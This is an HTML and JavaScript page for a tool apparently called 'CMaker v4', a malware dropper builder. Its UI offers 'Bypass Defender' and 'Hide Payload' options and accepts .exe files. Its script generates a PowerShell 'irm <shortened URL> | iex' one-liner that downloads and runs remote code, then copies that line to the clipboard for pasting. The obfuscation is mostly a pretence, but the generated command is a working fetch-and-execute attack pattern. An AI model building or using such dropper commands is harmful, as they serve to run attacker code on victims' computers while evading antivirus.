<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CMaker v4 - ASCII Obfuscator</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1e1e1e;
            color: white;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 450px;
            margin: 80px auto;
            background-color: #2c2c2c;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.7);
            text-align: center;
        }
        h1 {
            color: #9b59b6;
            font-size: 2.5em;
            margin-bottom: 20px;
        }
        label {
            display: block;
            font-size: 1.1em;
            margin-bottom: 8px;
            text-align: left;
        }
        input[type="text"], input[type="password"], input[type="file"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            background-color: #333;
            border: 1px solid #9b59b6;
            border-radius: 5px;
            color: white;
        }
        .checkbox-group {
            text-align: left;
            margin-bottom: 20px;
        }
        .checkbox-group input[type="checkbox"] {
            margin: 0 5px 10px;
        }
        .checkbox-group label {
            font-size: 1em;
            margin-bottom: 5px;
        }
        .file-button, button {
            width: 100%;
            padding: 12px;
            background-color: #9b59b6;
            border: none;
            border-radius: 5px;
            color: white;
            font-size: 1.2em;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.3s ease;
        }
        .file-button:hover, button:hover {
            background-color: #8e44ad;
        }
        .file-label {
            color: #ccc;
            font-size: 0.9em;
        }
        .bottom-label {
            margin-top: 30px;
            color: #bbb;
            font-size: 0.8em;
        }
        .error-msg {
            color: #ff4c4c;
            font-size: 0.9em;
            margin-top: 10px;
        }
        .file-preview {
            color: #ccc;
            font-size: 0.9em;
            margin-top: 10px;
            text-align: left;
        }
        .ascii-preview {
            background-color: #2d2d2d;
            color: #d3d3d3;
            padding: 15px;
            margin-top: 20px;
            font-family: monospace;
            overflow-y: auto;
            max-height: 150px;
            border: 1px solid #444;
            border-radius: 5px;
        }
        .copy-btn {
            background-color: #27ae60;
            border: none;
            padding: 12px;
            color: white;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
            transition: background-color 0.3s ease;
        }
        .copy-btn:hover {
            background-color: #219653;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>CMaker v4</h1>

        <form id="cmakerForm">
            <label for="username">Username</label>
            <input type="text" id="username" placeholder="Enter Username" required>

            <label for="password">Password</label>
            <input type="password" id="password" placeholder="Enter Password" required>

            <div class="checkbox-group">
                <input type="checkbox" id="shortCode">
                <label for="shortCode">Short Code</label>

                <input type="checkbox" id="bypassDefender">
                <label for="bypassDefender">Bypass Defender</label>

                <input type="checkbox" id="base64">
                <label for="base64">BASE64</label>

                <input type="checkbox" id="hidePayload">
                <label for="hidePayload">Hide Payload</label>

                <input type="checkbox" id="ascii">
                <label for="ascii">ASCII</label>
            </div>

            <label class="file-label">Select File (only .exe)</label>
            <input type="file" id="fileInput" class="file-button" accept=".exe">

            <div id="filePreview" class="file-preview"></div>

            <button type="submit">Submit</button>

            <div id="errorMessage" class="error-msg"></div>

            <div id="asciiPreview" class="ascii-preview" style="display: none;"></div>

            <button id="copyButton" class="copy-btn" style="display: none;" type="button">Copy Code</button>
        </form>

        <p class="bottom-label">Author: xStrong</p>
    </div>

    <script>
        const form = document.getElementById('cmakerForm');
        const fileInput = document.getElementById('fileInput');
        const errorMessage = document.getElementById('errorMessage');
        const asciiPreview = document.getElementById('asciiPreview');
        const copyButton = document.getElementById('copyButton');

        form.addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent form from submitting traditionally

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const file = fileInput.files[0];
            const asciiChecked = document.getElementById('ascii').checked;
            const shortCodeChecked = document.getElementById('shortCode').checked;

            // Check for validation errors
            if (!file) {
                errorMessage.textContent = 'Please select a .exe file.';
                return;
            }

            if (username === '' || password === '') {
                errorMessage.textContent = 'Username and Password are required.';
                return;
            }

            // Generate obfuscated code if Short Code is selected
            if (shortCodeChecked) {
                const rentryUrl = "https://rentry.co/your-static-url"; // Simulate the static page
                const finalUrl = `https://www.shorturl.at/${btoa(rentryUrl)}`; // Simulate short URL creation
                const obfuscatedCode = `Powershell "irm ${finalUrl} | iex"`;

                // Display the generated code
                asciiPreview.textContent = obfuscatedCode;
                asciiPreview.style.display = 'block';

                // Enable the copy button and store full ASCII string for copying
                copyButton.style.display = 'block';
                copyButton.setAttribute('data-ascii', obfuscatedCode);
            } else {
                errorMessage.textContent = 'Please check the Short Code option.';
            }
        });

        // Copy ASCII to clipboard when "Copy" is clicked
        copyButton.addEventListener('click', function() {
            const asciiString = copyButton.getAttribute('data-ascii');

            navigator.clipboard.writeText(asciiString).then(() => {
                alert('Obfuscated code copied to clipboard!');
            }).catch(err => {
                console.error('Failed to copy text: ', err);
            });
        });
    </script>

</body>
</html>
